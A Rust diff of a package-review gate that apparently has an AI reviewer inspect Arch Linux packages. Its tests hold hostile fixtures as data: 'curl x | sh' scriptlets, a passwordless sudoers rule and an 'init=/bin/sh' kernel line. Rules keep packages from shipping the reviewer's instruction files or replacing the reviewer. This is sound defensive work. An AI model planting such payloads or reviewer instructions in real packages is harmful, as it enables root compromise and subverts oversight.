+            ));
+        }
+        read.extend(archive.extract(&texts)?);
+        naming.clear();
+        for path in texts {
+            let bytes = read.get(&path).cloned().unwrap_or_default();
+            let content = content::classify(&path, false, false, &bytes);
+            if matches!(content, Content::Text(_) | Content::Lossy { .. }) {
+                naming.push((path.clone(), path.clone()));
+            }
+            found.push((path, content, Shipped::Bytes(bytes)));
+        }
+    }
+
+    let files = found
+        .into_iter()
+        .map(|(path, content, shipped)| {
+            let run_by = by.remove(&path).unwrap_or_default();
+            named_file(path, content, shipped, run_by)
+        })
+        .collect();
+    Ok((files, unfollowed))
+}
+
+/// The files of the archive that the texts in `naming` (who names, and the
+/// file its text was read from) name for the first time, sorted; `by`
+/// records who names each. What is `known` is reviewed as itself already.
+fn newly_named(
+    archive: &Archive,
+    naming: &[(String, String)],
     read: &HashMap<String, Vec<u8>>,
-) -> Vec<(String, String)> {
-    let mut executed: Vec<(String, String)> = Vec::new();
-    for (entry, source) in sources {
-        let Resolution::Regular(path) = source else {
+    known: &HashSet<&str>,
+    by: &mut HashMap<String, Vec<String>>,
+) -> Vec<String> {
+    let mut fresh: Vec<String> = Vec::new();
+    for (namer, source) in naming {
+        let Some(bytes) = read.get(source) else {
             continue;
         };
-        let Some(text) = read
-            .get(path)
-            .and_then(|bytes| std::str::from_utf8(bytes).ok())
-        else {
-            continue;
-        };
-        for program in executed_paths(text) {
-            // Scripts are small; a large program is a compiled binary, left
-            // to the package's own review like every other program.
-            let shipped = matches!(
-                archive.entry(&program).map(|found| &found.kind),
-                Some(Kind::File | Kind::HardLink(_))
-            ) && archive
-                .entry(&archive.regular_source(&program))
-                .is_some_and(|found| found.size <= MAX_TEXT_FILE_SIZE);
-            if shipped && !is_auto_run(&program) && !read.contains_key(&program) {
-                executed.push((program, entry.path.clone()));
+        for path in archive.named_in(&String::from_utf8_lossy(bytes)) {
+            // An empty file holds nothing to run.
+            let empty = archive.entry(&path).is_none_or(|entry| entry.size == 0);
+            if empty || known.contains(path.as_str()) || path == *source {
+                continue;
+            }
+            let namers = by.entry(path.clone()).or_default();
+            if namers.is_empty() {
+                fresh.push(path);
+            }
+            if !namers.contains(namer) {
+                namers.push(namer.clone());
             }
         }
     }
-    executed.sort();
-    executed.dedup_by(|left, right| left.0 == right.0);
-    executed
+    fresh.sort();
+    fresh
+}
+
+/// A file the reviewed ones name (`run_by`) as a payload file: its text
+/// starts with a line that says who names it.
+fn named_file(
+    path: String,
+    content: Content,
+    shipped: Shipped,
+    run_by: Vec<String>,
+) -> PayloadFile {
+    let namers: Vec<String> = run_by.iter().take(3).map(|namer| shown(namer)).collect();
+    let header = format!(
+        "# /{path} is a file of this package named in {}{}, which may run or read it.\n",
+        namers.join(", "),
+        if run_by.len() > namers.len() {
+            " and others"
+        } else {
+            ""
+        }
+    );
+    PayloadFile {
+        content: annotated(content, &header),
+        path,
+        run_by,
+        leads_outside: None,
+        shipped,
+    }
+}
+
+/// How a file that names another is called in a sentence.
+fn shown(namer: &str) -> String {
+    if namer == ".INSTALL" {
+        "the install scriptlet".to_string()
+    } else {
+        format!("/{namer}")
+    }
 }
 
 /// Each auto-run entry as a payload file: its own content, or a link's
@@ -1311,7 +1878,7 @@ fn payload_files(sources: &[Source<'_>], read: &HashMap<String, Vec<u8>>) -> Vec
             PayloadFile {
                 path: entry.path.clone(),
                 content,
-                run_by: None,
+                run_by: Vec::new(),
                 leads_outside: match (&entry.kind, source) {
                     (Kind::Symlink(_), Resolution::Outside(resolved)) => Some(resolved.clone()),
                     _ => None,
@@ -1655,8 +2222,9 @@ mod tests {
             panic!()
         };
         assert!(
-            run.contains("run by /usr/share/libalpm/hooks/x.hook") && run.contains("curl x | sh")
+            run.contains("named in /usr/share/libalpm/hooks/x.hook") && run.contains("curl x | sh")
         );
+        assert_eq!(reviewed.files[3].run_by, ["usr/share/libalpm/hooks/x.hook"]);
         opened.verify_unchanged().unwrap();
 
         // The declared name must be the transaction target.
@@ -1965,6 +2533,12 @@ mod tests {
                 "where no package's files belong",
             ),
             ("c", "lib/modules/x", "is a link to a directory in /usr"),
+            ("c2", "usr/sbin/x", "is a link to a directory in /usr"),
+            (
+                "c3",
+                "usr/lib64/libx.so",
+                "is a link to a directory in /usr",
+            ),
         ] {
             let (root, members) = package(name, "", &[(path, "x\n")]);
             let error = refused(&open(&root, &members, name), name);
@@ -2094,5 +2668,654 @@ mod tests {
         // A stream that ends inside an entry is refused, not half read.
         let cut = &tar[..700];
         assert!(super::attributes_in_tar(cut).is_err());
+    }
+
+    /// A package archive `name` (owned by root) with `info` after its name
+    /// in `.PKGINFO`, an optional scriptlet, and `files`.
+    fn pack(
+        dir: &Path,
+        name: &str,
+        info: &str,
+        install: Option<&str>,
+        files: &[(&str, &[u8])],
+    ) -> std::path::PathBuf {
+        let root = dir.join(format!("{name}-root"));
+        fs::create_dir_all(&root).unwrap();
+        fs::write(root.join(".PKGINFO"), format!("pkgname = {name}\n{info}")).unwrap();
+        let mut members = vec![".PKGINFO".to_string()];
+        if let Some(script) = install {
+            fs::write(root.join(".INSTALL"), script).unwrap();
+            members.push(".INSTALL".into());
+        }
+        for (path, bytes) in files {
+            fs::create_dir_all(root.join(path).parent().unwrap()).unwrap();
+            fs::write(root.join(path), bytes).unwrap();
+            let top = path.split('/').next().unwrap().to_string();
+            if !members.contains(&top) {
+                members.push(top);
+            }
+        }
+        let archive = dir.join(format!("{name}-1-1-any.pkg.tar"));
+        let members: Vec<&str> = members.iter().map(String::as_str).collect();
+        build(&root, &archive, &members, &["--uid", "0", "--gid", "0"]);
+        archive
+    }
+
+    const ELF: &[u8] = b"\x7fELF\x02\x01\x01\0\0\0\0\0\0\0\0\0\x03\0\x3e\0";
+
+    #[test]
+    fn a_package_named_like_guardian_or_its_reviewer_needs_the_right_origin() {
+        use super::name_violation;
+        let third = SourceClass::ThirdPartyRepo;
+        let local = SourceClass::LocalPackage;
+        let official = SourceClass::Official;
+        assert!(name_violation("omarchy-guardian", third, &[]).is_some());
+        assert!(name_violation("omarchy-guardian", local, &[]).is_none());
+        assert!(name_violation("omarchy-guardian", official, &[]).is_none());
+        for reviewer in ["opencode", "claude-code"] {
+            assert!(name_violation(reviewer, third, &[]).is_some(), "{reviewer}");
+            assert!(name_violation(reviewer, local, &[]).is_some(), "{reviewer}");
+            assert!(
+                name_violation(reviewer, official, &[]).is_none(),
+                "{reviewer}"
+            );
+            // The system configuration may trust that name from elsewhere.
+            assert!(name_violation(reviewer, local, &[reviewer.to_string()]).is_none());
+        }
+        assert!(name_violation("opencode-bin", third, &[]).is_none());
+        assert!(name_violation("anything", third, &[]).is_none());
+    }
+
+    #[test]
+    fn nobody_claims_guardians_place_and_only_an_owner_its_reviewers() {
+        use super::claim_violation;
+        let third = SourceClass::ThirdPartyRepo;
+        let claims = |info: &str, package: &str, class, trusted: &[String]| {
+            claim_violation(info, package, class, trusted).map(|(_, what)| what)
+        };
+        for key in ["replaces", "conflict", "provides"] {
+            assert_eq!(
+                claims(&format!("{key} = omarchy-guardian>=1\n"), "x", third, &[]),
+                Some("Guardian"),
+                "{key}"
+            );
+            // Not even an official package.
+            assert_eq!(
+                claims(
+                    &format!("{key} = omarchy-guardian\n"),
+                    "x",
+                    SourceClass::Official,
+                    &[]
+                ),
+                Some("Guardian")
+            );
+            for reviewer in ["opencode", "claude-code"] {
+                let info = format!("pkgver = 1\n{key} = {reviewer}=2\n");
+                assert_eq!(
+                    claims(&info, "x", third, &[]),
+                    Some("Guardian's reviewer"),
+                    "{key} {reviewer}"
+                );
+                assert_eq!(
+                    claims(&info, "x", SourceClass::LocalPackage, &[]),
+                    Some("Guardian's reviewer")
+                );
+                // A package that may ship the reviewer may also stand in
+                // for it: an official one, or one the system trusts.
+                assert_eq!(claims(&info, "x", SourceClass::Official, &[]), None);
+                assert_eq!(claims(&info, "x", third, &["x".to_string()]), None);
+            }
+        }
+        // A trusted reviewer package is not replaced by a stranger either.
+        let trusted = ["opencode-bin".to_string()];
+        assert_eq!(
+            claims("conflict = opencode-bin\n", "x", third, &trusted),
+            Some("Guardian's reviewer")
+        );
+        assert_eq!(
+            claims(
+                "provides = opencode\nconflict = opencode\n",
+                "opencode-bin",
+                third,
+                &trusted
+            ),
+            None
+        );
+        // A package provides itself, and other names are nobody's business.
+        assert_eq!(
+            claims(
+                "provides = omarchy-guardian=1\n",
+                "omarchy-guardian",
+                third,
+                &[]
+            ),
+            None
+        );
+        assert_eq!(
+            claims(
+                "provides = libfoo.so=1\nconflict = foo-git\n",
+                "x",
+                third,
+                &[]
+            ),
+            None
+        );
+        assert_eq!(
+            claims(
+                "depend = opencode\noptdepend = claude-code\n",
+                "x",
+                third,
+                &[]
+            ),
+            None
+        );
+    }
+
+    #[test]
+    fn a_package_of_guardians_name_must_be_guardian() {
+        if !tool_available("/usr/bin/bsdtar") {
+            return;
+        }
+        let dir = TempDir::new("payload-guardian-name");
+        let refused = |archive: &Path, name: &str, class| {
+            review(&Archive::open(archive).unwrap(), name, class, &[])
+                .err()
+                .map(|error| error.to_string())
+                .unwrap_or_default()
+        };
+        // An empty "upgrade" from a third-party repository, or from
+        // anywhere: installing it deletes the gate.
+        let empty = pack(dir.path(), "omarchy-guardian", "pkgver = 99-1\n", None, &[]);
+        let error = refused(&empty, "omarchy-guardian", SourceClass::ThirdPartyRepo);
+        assert!(error.contains("third-party repository"), "{error}");
+        for class in [SourceClass::LocalPackage, SourceClass::Official] {
+            let error = refused(&empty, "omarchy-guardian", class);
+            assert!(
+                error.contains("does not ship /usr/bin/omarchy-guardian"),
+                "{error}"
+            );
+        }
+        let sub = TempDir::new("payload-guardian-name-full");
+        let whole = pack(
+            sub.path(),
+            "omarchy-guardian",
+            "",
+            None,
+            &[
+                ("usr/bin/omarchy-guardian", ELF),
+                (
+                    "usr/lib/omarchy-guardian/guardian-pacman-hook",
+                    b"#!/bin/sh\n",
+                ),
+            ],
+        );
+        assert_eq!(
+            refused(&whole, "omarchy-guardian", SourceClass::LocalPackage),
+            ""
+        );
+        let error = refused(&whole, "omarchy-guardian", SourceClass::ThirdPartyRepo);
+        assert!(error.contains("third-party repository"), "{error}");
+
+        // A reviewer's name on a package that drops the reviewer.
+        let sub = TempDir::new("payload-reviewer-name");
+        let hollow = pack(sub.path(), "claude-code", "", None, &[]);
+        let error = refused(&hollow, "claude-code", SourceClass::ThirdPartyRepo);
+        assert!(
+            error.contains("would replace Guardian's reviewer"),
+            "{error}"
+        );
+        assert_eq!(refused(&hollow, "claude-code", SourceClass::Official), "");
+        let rival = pack(
+            sub.path(),
+            "rival",
+            "conflict = opencode\n",
+            None,
+            &[("usr/bin/rival", b"x\n")],
+        );
+        let error = refused(&rival, "rival", SourceClass::LocalPackage);
+        assert!(
+            error.contains("remove or stand in for Guardian's reviewer"),
+            "{error}"
+        );
+    }
+
+    #[test]
+    fn what_the_reviewer_reads_as_its_instructions_is_nobodys_to_ship() {
+        for path in [
+            "etc/opencode/opencode.json",
+            "etc/claude-code/managed-settings.json",
+            "etc/claude-code",
+            "usr/AGENTS.md",
+            "usr/CLAUDE.md",
+            "usr/CONTEXT.md",
+            "usr/opencode.json",
+            "usr/opencode.jsonc",
+            "usr/.opencode/agent/review.md",
+            "usr/.claude/settings.json",
+            "AGENTS.md",
+            "CLAUDE.md",
+            "opencode.json",
+        ] {
+            for (package, class) in [
+                ("evil", SourceClass::ThirdPartyRepo),
+                ("opencode", SourceClass::Official),
+                ("claude-code", SourceClass::Official),
+                ("omarchy-guardian", SourceClass::LocalPackage),
+            ] {
+                assert!(
+                    protected_violation(path, package, class, &["evil".to_string()]).is_some(),
+                    "{path} from {package}"
+                );
+            }
+        }
+        // Elsewhere those names are ordinary files.
+        for path in [
+            "usr/share/doc/x/AGENTS.md",
+            "usr/lib/x/CLAUDE.md",
+            "etc/x/opencode.json",
+        ] {
+            assert!(
+                protected_violation(path, "x", SourceClass::ThirdPartyRepo, &[]).is_none(),
+                "{path}"
+            );
+        }
+        // The hook libalpm always loads is Guardian's own.
+        let hook = "usr/share/libalpm/hooks/omarchy-guardian.hook";
+        assert!(protected_violation(hook, "evil", SourceClass::Official, &[]).is_some());
+        assert!(
+            protected_violation(hook, "omarchy-guardian", SourceClass::LocalPackage, &[]).is_none()
+        );
+    }
+
+    #[test]
+    fn files_the_scriptlet_and_auto_run_files_name_are_reviewed_with_them() {
+        if !tool_available("/usr/bin/bsdtar") {
+            return;
+        }
+        let dir = TempDir::new("payload-named");
+        let mut image = b"\x89PNG\r\n\x1a\n".to_vec();
+        image.extend([0_u8, 1, 2, 3, 0, 0, 0, 13]);
+        let archive = pack(
+            dir.path(),
+            "pkg",
+            "",
+            Some(
+                "post_install() {\n  /usr/lib/pkg/setup.sh\n  pkg-helper --init\n  cat \"$pkgdir/usr/share/pkg/logo.png\"\n}\n",
+            ),
+            &[
+                (
+                    "usr/lib/pkg/setup.sh",
+                    b"#!/bin/sh\n. /usr/lib/pkg/lib.sh\n",
+                ),
+                ("usr/lib/pkg/lib.sh", b"curl x | sh\n"),
+                ("usr/bin/pkg-helper", ELF),
+                ("usr/share/pkg/logo.png", &image),
+                (
+                    "usr/share/libalpm/hooks/x.hook",
+                    b"[Action]\nExec = /usr/bin/sh /usr/share/pkg/run.sh\n",
+                ),
+                ("usr/share/pkg/run.sh", b"echo hook\n"),
+                (
+                    "usr/lib/systemd/system/multi-user.target.wants/x.service",
+                    b"[Service]\nExecStart=/usr/bin/python /usr/lib/pkg/x.py\n",
+                ),
+                ("usr/lib/pkg/x.py", b"print('unit')\n"),
+                ("etc/profile.d/x.sh", b". /usr/share/pkg/env.sh\n"),
+                ("usr/share/pkg/env.sh", b"export X=1\n"),
+                (
+                    "usr/lib/udev/rules.d/99-x.rules",
+                    b"ACTION==\"add\", RUN+=\"/usr/lib/pkg/plug %k\"\n",
+                ),
+                ("usr/lib/pkg/plug", b"#!/bin/sh\necho plug\n"),
+                ("etc/cron.d/x", b"* * * * * root /bin/sh /lib/pkg/cron.sh\n"),
+                ("usr/lib/pkg/cron.sh", b"echo cron\n"),
+                ("usr/share/pkg/unrelated.sh", b"echo never named\n"),
+                ("usr/share/pkg/empty", b""),
+            ],
+        );
+        let opened = Archive::open(&archive).unwrap();
+        let reviewed = review(&opened, "pkg", SourceClass::ThirdPartyRepo, &[]).unwrap();
+        assert!(reviewed.unfollowed.is_empty(), "{:?}", reviewed.unfollowed);
+        let named: Vec<(&str, Vec<&str>)> = reviewed
+            .files
+            .iter()
+            .filter(|file| !file.run_by.is_empty())
+            .map(|file| {
+                (
+                    file.path.as_str(),
+                    file.run_by.iter().map(String::as_str).collect(),
+                )
+            })
+            .collect();
+        assert_eq!(
+            named,
+            [
+                ("usr/bin/pkg-helper", vec![".INSTALL"]),
+                ("usr/lib/pkg/cron.sh", vec!["etc/cron.d/x"]),
+                ("usr/lib/pkg/lib.sh", vec!["usr/lib/pkg/setup.sh"]),
+                ("usr/lib/pkg/plug", vec!["usr/lib/udev/rules.d/99-x.rules"]),
+                ("usr/lib/pkg/setup.sh", vec![".INSTALL"]),
+                (
+                    "usr/lib/pkg/x.py",
+                    vec!["usr/lib/systemd/system/multi-user.target.wants/x.service"]
+                ),
+                ("usr/share/pkg/env.sh", vec!["etc/profile.d/x.sh"]),
+                ("usr/share/pkg/logo.png", vec![".INSTALL"]),
+                (
+                    "usr/share/pkg/run.sh",
+                    vec!["usr/share/libalpm/hooks/x.hook"]
+                ),
+            ]
+        );
+        let content = |path: &str| {
+            &reviewed
+                .files
+                .iter()
+                .find(|file| file.path == path)
+                .unwrap()
+                .content
+        };
+        assert!(
+            matches!(content("usr/lib/pkg/setup.sh"), Content::Text(text)
+                if text.contains("named in the install scriptlet") && text.contains(". /usr/lib/pkg/lib.sh"))
+        );
+        assert!(matches!(content("usr/lib/pkg/lib.sh"), Content::Text(text)
+                if text.contains("named in /usr/lib/pkg/setup.sh") && text.contains("curl x | sh")));
+        // A compiled program and a picture are what they are, not read.
+        assert!(
+            matches!(content("usr/bin/pkg-helper"), Content::Binary(format) if format.executable())
+        );
+        assert!(
+            matches!(content("usr/share/pkg/logo.png"), Content::Binary(format) if !format.executable())
+        );
+        // What is read as an auto-run file itself is not listed again.
+        assert!(reviewed.read_as_auto_run.contains("etc/cron.d/x"));
+        assert!(!reviewed.read_as_auto_run.contains("usr/lib/pkg/cron.sh"));
+    }
+
+    #[test]
+    fn what_cannot_be_followed_makes_the_review_incomplete() {
+        if !tool_available("/usr/bin/bsdtar") {
+            return;
+        }
+        // Text too large to review, and a chain longer than is followed.
+        let dir = TempDir::new("payload-unfollowed");
+        let mut big = b"#!/bin/sh\n".to_vec();
+        big.resize(2 * 1024 * 1024 + 1, b'#');
+        let mut program = ELF.to_vec();
+        program.resize(3 * 1024 * 1024, 0);
+        let archive = pack(
+            dir.path(),
+            "pkg",
+            "",
+            Some(
+                "post_install() { /usr/lib/pkg/big.sh; /usr/lib/pkg/a.sh; /usr/lib/pkg/large-program; }\n",
+            ),
+            &[
+                ("usr/lib/pkg/big.sh", &big),
+                ("usr/lib/pkg/large-program", &program),
+                ("usr/lib/pkg/a.sh", b". /usr/lib/pkg/b.sh\n"),
+                ("usr/lib/pkg/b.sh", b". /usr/lib/pkg/c.sh\n"),
+                ("usr/lib/pkg/c.sh", b". /usr/lib/pkg/d.sh\n"),
+                ("usr/lib/pkg/d.sh", b". /usr/lib/pkg/e.sh\n"),
+                ("usr/lib/pkg/e.sh", b"curl x | sh\n"),
+            ],
+        );
+        let opened = Archive::open(&archive).unwrap();
+        let reviewed = review(&opened, "pkg", SourceClass::LocalPackage, &[]).unwrap();
+        let paths: Vec<&str> = reviewed
+            .files
+            .iter()
+            .map(|file| file.path.as_str())
+            .collect();
+        assert_eq!(
+            paths,
+            [
+                "usr/lib/pkg/a.sh",
+                "usr/lib/pkg/b.sh",
+                "usr/lib/pkg/c.sh",
+                "usr/lib/pkg/large-program"
+            ]
+        );
+        // A program of any size is named, never read whole.
+        assert!(matches!(reviewed.files[3].content, Content::Binary(_)));
+        assert_eq!(reviewed.unfollowed.len(), 2, "{:?}", reviewed.unfollowed);
+        assert!(
+            reviewed.unfollowed[0].contains("/usr/lib/pkg/big.sh")
+                && reviewed.unfollowed[0].contains("over the 2 MiB review limit"),
+            "{:?}",
+            reviewed.unfollowed
+        );
+        assert!(
+            reviewed.unfollowed[1].contains("/usr/lib/pkg/d.sh")
+                && reviewed.unfollowed[1].contains("were not followed"),
+            "{:?}",
+            reviewed.unfollowed
+        );
+    }
+
+    #[test]
+    fn the_first_bytes_of_files_are_read_in_one_pass() {
+        if !tool_available("/usr/bin/bsdtar") {
+            return;
+        }
+        let dir = TempDir::new("payload-heads");
+        let mut long = vec![b'a'; 20_000];
+        long[..4].copy_from_slice(b"head");
+        let archive = pack(
+            dir.path(),
+            "pkg",
+            "",
+            None,
+            &[
+                ("usr/share/pkg/one", b"first\n"),
+                ("usr/share/pkg/long", &long),
+                ("usr/share/pkg/[odd]*name", b"odd\n"),
+                ("usr/share/pkg/skipped", b"not asked for\n"),
+            ],
+        );
+        let opened = Archive::open(&archive).unwrap();
+        let asked = [
+            "usr/share/pkg/[odd]*name".to_string(),
+            "usr/share/pkg/long".to_string(),
+            "usr/share/pkg/one".to_string(),
+        ];
+        let heads = opened.heads(&asked).unwrap();
+        assert_eq!(heads.len(), 3);
+        assert_eq!(heads["usr/share/pkg/one"], b"first\n");
+        assert_eq!(heads["usr/share/pkg/[odd]*name"], b"odd\n");
+        assert_eq!(
+            heads["usr/share/pkg/long"].len(),
+            crate::content::PROBE_SIZE
+        );
+        assert!(heads["usr/share/pkg/long"].starts_with(b"head"));
+        assert!(opened.heads(&[]).unwrap().is_empty());
+    }
+
+    #[test]
+    fn completions_are_reviewed_for_other_than_official_packages_and_misplaced_files_named() {
+        if !tool_available("/usr/bin/bsdtar") {
+            return;
+        }
+        let dir = TempDir::new("payload-unofficial");
+        let archive = pack(
+            dir.path(),
+            "pkg",
+            "",
+            None,
+            &[
+                (
+                    "usr/share/bash-completion/completions/pkg",
+                    b"complete -F _pkg pkg\n",
+                ),
+                ("usr/share/zsh/site-functions/_pkg", b"#compdef pkg\n"),
+                (
+                    "usr/share/vim/vimfiles/plugin/pkg.vim",
+                    b"autocmd VimEnter * echo 1\n",
+                ),
+                (
+                    "usr/local/lib/systemd/system/sshd.service",
+                    b"[Service]\nExecStart=/usr/bin/x\n",
+                ),
+                (
+                    "usr/share/systemd/user/pipewire.service",
+                    b"[Service]\nExecStart=/usr/bin/y\n",
+                ),
+                ("etc/skel/.bashrc", b"alias ls=ls\n"),
+                ("etc/skel/.config/app/data.json", b"{}\n"),
+                ("usr/lib/security/pam_pkg.so", ELF),
+                ("usr/lib/glibc-hwcaps/x86-64-v3/libc.so.6", ELF),
+                ("etc/kernel/cmdline", b"quiet init=/bin/sh\n"),
+            ],
+        );
+        let opened = Archive::open(&archive).unwrap();
+        let paths = |class| {
+            let reviewed = review(&opened, "pkg", class, &[]).unwrap();
+            let paths: Vec<String> = reviewed.files.into_iter().map(|file| file.path).collect();
+            (paths, reviewed.misplaced)
+        };
+        let (third, misplaced) = paths(SourceClass::ThirdPartyRepo);
+        assert_eq!(
+            third,
+            [
+                "etc/skel/.bashrc",
+                "usr/local/lib/systemd/system/sshd.service",
+                "usr/share/bash-completion/completions/pkg",
+                "usr/share/systemd/user/pipewire.service",
+                "usr/share/vim/vimfiles/plugin/pkg.vim",
+                "usr/share/zsh/site-functions/_pkg",
+            ]
+        );
+        let misplaced: Vec<(&str, &str)> = misplaced
+            .iter()
+            .map(|(path, when)| (path.as_str(), *when))
+            .collect();
+        assert_eq!(
+            misplaced,
+            [
+                ("usr/lib/security/pam_pkg.so", "runs when someone logs in"),
+                (
+                    "usr/lib/glibc-hwcaps/x86-64-v3/libc.so.6",
+                    "applies to every program started"
+                ),
+                ("etc/kernel/cmdline", "runs before the system starts"),
+            ]
+        );
+        let (official, misplaced) = paths(SourceClass::Official);
+        assert_eq!(
+            official,
+            [
+                "etc/skel/.bashrc",
+                "usr/local/lib/systemd/system/sshd.service",
+                "usr/share/systemd/user/pipewire.service",
+                "usr/share/vim/vimfiles/plugin/pkg.vim",
+            ]
+        );
+        assert!(misplaced.is_empty());
+    }
+
+    #[test]
+    fn an_archive_rewritten_in_place_no_longer_matches_its_fingerprint() {
+        use std::io::{Seek, SeekFrom, Write};
+        if !tool_available("/usr/bin/bsdtar") {
+            return;
+        }
+        let dir = TempDir::new("payload-fingerprint");
+        let archive = pack(dir.path(), "pkg", "", None, &[("usr/bin/pkg", b"one\n")]);
+        let opened = Archive::open(&archive).unwrap();
+        let fingerprint = opened.fingerprint().unwrap();
+        assert_eq!(
+            fingerprint.digest,
+            Some(crate::sha256::Sha256::digest(&fs::read(&archive).unwrap()))
+        );
+        fingerprint.verify().unwrap();
+        // Only a file nobody but root can touch goes unhashed.
+        assert!(!super::root_alone(
+            &archive,
+            &fs::metadata(&archive).unwrap()
+        ));
+        let system = Path::new("/usr/bin/bsdtar");
+        let metadata = fs::metadata(system).unwrap();
+        if std::os::unix::fs::MetadataExt::uid(&metadata) == 0 {
+            assert!(super::root_alone(system, &metadata));
+            assert!(!super::root_alone(Path::new("usr/bin/bsdtar"), &metadata));
+        }
+
+        // The same file, the same bytes, but not what was hashed.
+        let forged = super::Fingerprint {
+            digest: Some(crate::sha256::Sha256::digest(b"something else")),
+            ..fingerprint.clone()
+        };
+        assert!(forged.verify().is_err());
+
+        // Rewritten in place: same inode, same size, other bytes.
+        let before = fs::metadata(&archive).unwrap();
+        let mut file = fs::OpenOptions::new().write(true).open(&archive).unwrap();
+        file.seek(SeekFrom::Start(600)).unwrap();
+        file.write_all(b"two\n").unwrap();
+        file.sync_all().unwrap();
+        file.set_modified(before.modified().unwrap()).unwrap();
+        drop(file);
+        let after = fs::metadata(&archive).unwrap();
+        assert_eq!(before.len(), after.len());
+        assert_eq!(before.modified().unwrap(), after.modified().unwrap());
+        let error = fingerprint.verify().unwrap_err().to_string();
+        assert!(
+            error.contains("changed while it was being reviewed"),
+            "{error}"
+        );
+        // The kernel's change time alone gives it away, hash aside.
+        assert!(opened.verify_unchanged().is_err());
+
+        // A file swapped in under the same name is another file.
+        let other = TempDir::new("payload-fingerprint-swap");
+        let archive = pack(other.path(), "pkg", "", None, &[("usr/bin/pkg", b"one\n")]);
+        let fingerprint = Archive::open(&archive).unwrap().fingerprint().unwrap();
+        let copy = other.path().join("copy");
+        fs::copy(&archive, &copy).unwrap();
+        fs::rename(&copy, &archive).unwrap();
+        assert!(fingerprint.verify().is_err());
+    }
+
+    #[test]
+    fn what_a_package_puts_where_a_link_leads() {
+        use super::Replacement;
+        if !tool_available("/usr/bin/bsdtar") {
+            return;
+        }
+        let dir = TempDir::new("payload-replacement");
+        let mut program = ELF.to_vec();
+        program.resize(3 * 1024 * 1024, 0);
+        let mut text = b"ALL ALL=(ALL) ALL\n".to_vec();
+        text.resize(2 * 1024 * 1024 + 1, b'#');
+        let archive = pack(
+            dir.path(),
+            "pkg",
+            "",
+            None,
+            &[
+                ("usr/share/pkg/rule", b"ALL ALL=(ALL) NOPASSWD: ALL\n"),
+                ("usr/share/pkg/program", &program),
+                ("usr/share/pkg/long-rule", &text),
+            ],
+        );
+        let opened = Archive::open(&archive).unwrap();
+        assert_eq!(
+            opened.replacement("usr/share/pkg/rule"),
+            Some(Replacement::File(b"ALL ALL=(ALL) NOPASSWD: ALL\n".to_vec()))
+        );
+        assert_eq!(
+            opened.replacement("usr/share/pkg/program"),
+            Some(Replacement::Binary("ELF executable"))
+        );
+        assert!(matches!(
+            opened.replacement("usr/share/pkg/long-rule"),
+            Some(Replacement::Unreadable(_))
+        ));
+        assert_eq!(opened.replacement("usr/share/pkg"), None);
+        assert_eq!(opened.replacement("usr/share/other/rule"), None);
+        assert_eq!(super::through_root_links("sbin/x"), "usr/bin/x");
+        assert_eq!(super::through_root_links("usr/lib64/x/y"), "usr/lib/x/y");
+        assert_eq!(super::through_root_links("usr/share/x"), "usr/share/x");
     }
 }
